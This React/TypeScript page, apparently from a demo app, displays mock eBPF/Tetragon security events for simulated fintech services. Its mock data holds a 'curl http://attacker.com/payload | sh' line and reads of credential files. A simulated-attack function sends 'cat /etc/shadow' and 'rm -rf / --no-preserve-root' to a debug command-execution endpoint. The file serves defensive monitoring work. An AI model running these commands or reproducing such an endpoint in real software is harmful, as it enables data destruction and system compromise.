import React, { useState, useEffect, useMemo } from 'react';
import {
  Row,
  Col,
  Card,
  Typography,
  Table,
  Tag,
  Badge,
  Button,
  Space,
  Divider,
  Alert,
  Timeline,
  Statistic,
  Progress,
  Switch,
  Input,
  Select,
  DatePicker,
  Tabs,
  Tooltip
} from 'antd';
import {
  SecurityScanOutlined,
  WarningOutlined,
  FileOutlined,
  GlobalOutlined,
  CodeOutlined,
  PlayCircleOutlined,
  StopOutlined,
  ReloadOutlined,
  ExportOutlined,
  SearchOutlined,
  ExperimentOutlined,
  EyeOutlined,
  SafetyCertificateOutlined,
  BugOutlined,
  ClockCircleOutlined,
  FileTextOutlined,
} from '@ant-design/icons';
import styles from './Security.module.css';

// 導入安全測試組件
import SecurityTesting from './SecurityTesting';
// 導入Tetragon事件流組件
import TetragonEventStream from '../../components/TetragonEventStream';

const { Title, Text, Paragraph } = Typography;
const { Search } = Input;
const { Option } = Select;
const { RangePicker } = DatePicker;
const { TabPane } = Tabs;

// 定義事件詳情的類型
interface NetworkConnectionDetails {
  destination: string;
  port: number;
  protocol: string;
}

interface FileAccessDetails {
  filename: string;
  mode: string;
  userId: number;
}

interface CommandExecutionDetails {
  command: string;
  parentProcess: string;
  args: string[];
}

interface CryptoOperationDetails {
  operation: string;
  keyfile: string;
  algorithm: string;
}

// 聯合類型
type EventDetails = NetworkConnectionDetails | FileAccessDetails | CommandExecutionDetails | CryptoOperationDetails | Record<string, any>;

// 安全事件接口
interface SecurityEvent {
  key: string;
  timestamp: string;
  processId: number;
  processName: string;
  eventType: string;
  description: string;
  details: EventDetails;
  severity: string;
  service: string;
  podName: string;
  namespace: string;
  action: string;
}

// 模擬eBPF安全事件數據
const mockSecurityEvents: SecurityEvent[] = [
  {
    key: '1',
    timestamp: '2023-12-01 10:45:12.123',
    processId: 12345,
    processName: 'curl',
    eventType: 'NETWORK_CONNECTION',
    description: '外部DNS查詢到可疑域名',
    details: {
      destination: 'malicious-domain.com',
      port: 53,
      protocol: 'UDP',
    },
    severity: 'CRITICAL',
    service: 'payment-gateway',
    podName: 'payment-gateway-7d8f9c6b5-x2m4n',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '2',
    timestamp: '2023-12-01 10:42:33.456',
    processId: 9876,
    processName: 'cat',
    eventType: 'FILE_ACCESS',
    description: '讀取敏感系統文件',
    details: {
      filename: '/etc/passwd',
      mode: 'READ',
      userId: 0,
    },
    severity: 'HIGH',
    service: 'trading-api',
    podName: 'trading-api-6f4d8c9b2-k8s7p',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '3',
    timestamp: '2023-12-01 10:40:15.789',
    processId: 5432,
    processName: 'sh',
    eventType: 'COMMAND_EXECUTION',
    description: '執行可疑的shell命令',
    details: {
      command: 'curl http://attacker.com/payload | sh',
      parentProcess: 'risk-engine',
      args: ['-c', 'curl http://attacker.com/payload | sh'],
    },
    severity: 'CRITICAL',
    service: 'risk-engine',
    podName: 'risk-engine-5c7b8d4f6-m9n3x',
    namespace: 'fintech-demo',
    action: 'BLOCKED',
  },
  {
    key: '4',
    timestamp: '2023-12-01 10:38:45.012',
    processId: 7891,
    processName: 'openssl',
    eventType: 'CRYPTO_OPERATION',
    description: '加密操作異常',
    details: {
      operation: 'decrypt',
      keyfile: '/root/.private_key',
      algorithm: 'AES-256',
    },
    severity: 'MEDIUM',
    service: 'audit-service',
    podName: 'audit-service-8b5c7d9e1-p4q6r',
    namespace: 'fintech-demo',
    action: 'MONITORED',
  },
];

const Security: React.FC = () => {
  const [realTimeMode, setRealTimeMode] = useState(true);
  const [events, setEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [filteredEvents, setFilteredEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [loading, setLoading] = useState(false);
  const [selectedEventType, setSelectedEventType] = useState<string>('ALL');
  const [selectedSeverity, setSelectedSeverity] = useState<string>('ALL');

  // 模擬實時事件更新
  useEffect(() => {
    if (!realTimeMode) return;

    const interval = setInterval(() => {
      const eventTypes = ['NETWORK_CONNECTION', 'FILE_ACCESS', 'COMMAND_EXECUTION'];
      const selectedEventType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
      const processNames = ['curl', 'wget', 'nc', 'python', 'sh', 'bash'];
      const selectedProcess = processNames[Math.floor(Math.random() * processNames.length)];
      const services = ['trading-api', 'risk-engine', 'payment-gateway', 'audit-service'];
      const selectedService = services[Math.floor(Math.random() * services.length)];
      
      // 根據事件類型生成對應的詳細信息
      let details: EventDetails;
      switch (selectedEventType) {
        case 'NETWORK_CONNECTION':
          details = {
            destination: `${Math.random() > 0.5 ? 'suspicious-site.com' : 'api.example.com'}`,
            port: Math.floor(Math.random() * 65535),
            protocol: Math.random() > 0.5 ? 'TCP' : 'UDP',
          } as NetworkConnectionDetails;
          break;
        case 'FILE_ACCESS':
          details = {
            filename: Math.random() > 0.5 ? '/etc/passwd' : '/tmp/data.txt',
            mode: Math.random() > 0.5 ? 'READ' : 'WRITE',
            userId: Math.floor(Math.random() * 1000),
          } as FileAccessDetails;
          break;
        case 'COMMAND_EXECUTION':
          details = {
            command: `${selectedProcess} script.sh`,
            parentProcess: selectedService,
            args: ['-c', 'some command'],
          } as CommandExecutionDetails;
          break;
        default:
          details = {};
      }

      // 模擬新的安全事件
      const newEvent: SecurityEvent = {
        key: `${Date.now()}`,
        timestamp: new Date().toLocaleString('zh-TW', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        }),
        processId: Math.floor(Math.random() * 99999),
        processName: selectedProcess,
        eventType: selectedEventType,
        description: '新檢測到的安全事件',
        details,
        severity: ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'][Math.floor(Math.random() * 4)],
        service: selectedService,
        podName: `${selectedService}-${Math.random().toString(36).substring(2, 8)}`,
        namespace: 'fintech-demo',
        action: ['ALLOWED', 'BLOCKED', 'MONITORED'][Math.floor(Math.random() * 3)],
      };

      setEvents(prev => {
        // 確保不超過50個事件，避免性能問題
        const newEvents = [newEvent, ...prev];
        return newEvents.length > 50 ? newEvents.slice(0, 50) : newEvents;
      });
    }, 5000);

    return () => {
      clearInterval(interval);
    };
  }, [realTimeMode]);

  // 過濾事件
  useEffect(() => {
    let filtered = events;
    
    if (selectedEventType !== 'ALL') {
      filtered = filtered.filter(event => event.eventType === selectedEventType);
    }
    
    if (selectedSeverity !== 'ALL') {
      filtered = filtered.filter(event => event.severity === selectedSeverity);
    }
    
    setFilteredEvents(filtered);
  }, [events, selectedEventType, selectedSeverity]);

  // 獲取嚴重性標籤
  const getSeverityTag = (severity: string) => {
    const severityConfig = {
      CRITICAL: { color: 'red', text: '嚴重' },
      HIGH: { color: 'orange', text: '高' },
      MEDIUM: { color: 'yellow', text: '中' },
      LOW: { color: 'green', text: '低' },
    };
    const config = severityConfig[severity as keyof typeof severityConfig] || { color: 'default', text: severity };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 獲取事件類型標籤
  const getEventTypeTag = (eventType: string) => {
    const typeConfig = {
      FILE_ACCESS: { color: 'blue', icon: <FileOutlined />, text: '文件訪問' },
      NETWORK_CONNECTION: { color: 'purple', icon: <GlobalOutlined />, text: '網絡連接' },
      COMMAND_EXECUTION: { color: 'red', icon: <CodeOutlined />, text: '命令執行' },
      CRYPTO_OPERATION: { color: 'gold', icon: <SecurityScanOutlined />, text: '加密操作' },
    };
    const config = typeConfig[eventType as keyof typeof typeConfig] || { 
      color: 'default', 
      icon: <WarningOutlined />, 
      text: eventType 
    };
    return (
      <Tag color={config.color} icon={config.icon}>
        {config.text}
      </Tag>
    );
  };

  // 獲取動作標籤
  const getActionTag = (action: string) => {
    const actionConfig = {
      ALLOWED: { color: 'green', text: '允許' },
      BLOCKED: { color: 'red', text: '阻止' },
      MONITORED: { color: 'blue', text: '監控' },
    };
    const config = actionConfig[action as keyof typeof actionConfig] || { color: 'default', text: action };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 觸發模擬攻擊
  const triggerMockAttack = async (attackType: string) => {
    setLoading(true);
    try {
      // 模擬調用後端API觸發安全事件
      const response = await fetch(`/api/trading/debug/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          command: attackType === 'file' ? 'cat' : attackType === 'network' ? 'curl' : 'sh',
          args: attackType === 'file' ? ['/etc/shadow'] : 
                attackType === 'network' ? ['http://malicious-site.com'] : 
                ['-c', 'rm -rf / --no-preserve-root']
        })
      });
    } catch (error) {
      console.log('模擬攻擊觸發:', attackType);
    } finally {
      setLoading(false);
    }
  };

  const eventColumns = [
    {
      title: '時間',
      dataIndex: 'timestamp',
      key: 'timestamp',
      width: 180,
      render: (timestamp: string) => (
        <Text code style={{ fontSize: '12px' }}>
          {timestamp}
        </Text>
      ),
    },
    {
      title: '事件類型',
      dataIndex: 'eventType',
      key: 'eventType',
      width: 140,
      render: getEventTypeTag,
    },
    {
      title: '嚴重性',
      dataIndex: 'severity',
      key: 'severity',
      width: 80,
      render: getSeverityTag,
    },
    {
      title: '進程',
      key: 'process',
      width: 120,
      render: (record: SecurityEvent) => (
        <Space direction="vertical" size={0}>
          <Text strong>{record.processName}</Text>
          <Text type="secondary" style={{ fontSize: '12px' }}>
            PID: {record.processId}
          </Text>
        </Space>
      ),
    },
    {
      title: '描述',
      dataIndex: 'description',
      key: 'description',
      ellipsis: true,
    },
    {
      title: '服務',
      dataIndex: 'service',
      key: 'service',
      width: 120,
      render: (service: string) => <Tag>{service}</Tag>,
    },
    {
      title: '動作',
      dataIndex: 'action',
      key: 'action',
      width: 80,
      render: getActionTag,
    },
  ];

  // 統計數據
  const eventStats = useMemo(() => {
    return events.reduce((acc: { [key: string]: number }, event) => {
      acc[event.severity] = (acc[event.severity] || 0) + 1;
      acc.TOTAL = (acc.TOTAL || 0) + 1;
      return acc;
    }, { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, TOTAL: 0 });
  }, [events]);

  return (
    <div className={styles.securityPage}>
      <Title level={2}><SecurityScanOutlined /> eBPF 安全事件中心</Title>
      <Paragraph type="secondary">基於 Cilium/Tetragon 的實時內核級安全事件監控與分析。</Paragraph>

      <Card className={styles.statsCard}>
        <Row gutter={16}>
          <Col span={4}><Statistic title="事件總數" value={eventStats.TOTAL} /></Col>
          <Col span={4}><Statistic title="嚴重" value={eventStats.CRITICAL} valueStyle={{color: '#f5222d'}} /></Col>
          <Col span={4}><Statistic title="高危" value={eventStats.HIGH} valueStyle={{color: '#fa541c'}} /></Col>
          <Col span={4}><Statistic title="中危" value={eventStats.MEDIUM} valueStyle={{color: '#faad14'}} /></Col>
          <Col span={4}><Statistic title="低危" value={eventStats.LOW} valueStyle={{color: '#1890ff'}} /></Col>
        </Row>
      </Card>
      
      <Card>
        <div className={styles.filterBar}>
          <Search placeholder="搜索描述、服務或Pod名稱..." style={{ width: 300 }} />
          <Space>
            <Select defaultValue="ALL" style={{ width: 120 }}>
              <Option value="ALL">所有嚴重性</Option>
              <Option value="CRITICAL">嚴重</Option>
              <Option value="HIGH">高</Option>
              <Option value="MEDIUM">中</Option>
              <Option value="LOW">低</Option>
            </Select>
            <RangePicker />
            <Button type="primary">篩選</Button>
          </Space>
        </div>

        <Table
          columns={eventColumns}
          dataSource={filteredEvents}
          rowClassName={(record) => styles[`severity-row-${record.severity.toLowerCase()}`]}
          expandable={{
            expandedRowRender: record => <ExpandedEventDetails record={record} />,
            rowExpandable: () => true,
          }}
        />
      </Card>
    </div>
  );
};

const ExpandedEventDetails: React.FC<{ record: any }> = ({ record }) => (
  <div className={styles.expandedDetails}>
    <Title level={5}>事件詳情</Title>
    <Paragraph><Text strong>描述: </Text>{record.description}</Paragraph>
    <Row gutter={24}>
      <Col span={12}>
        <Paragraph><ClockCircleOutlined /> <Text strong>時間戳: </Text>{record.timestamp}</Paragraph>
        <Paragraph><CodeOutlined /> <Text strong>服務: </Text>{record.service}</Paragraph>
      </Col>
      <Col span={12}>
        <Paragraph><BugOutlined /> <Text strong>進程: </Text>{record.processName}</Paragraph>
        <Paragraph><FileTextOutlined /> <Text strong>Pod: </Text>{record.podName}</Paragraph>
      </Col>
    </Row>
    <Title level={5} style={{marginTop: 16}}>上下文數據</Title>
    <pre className={styles.detailsJson}>{JSON.stringify(record.details, null, 2)}</pre>
  </div>
);

export default Security; 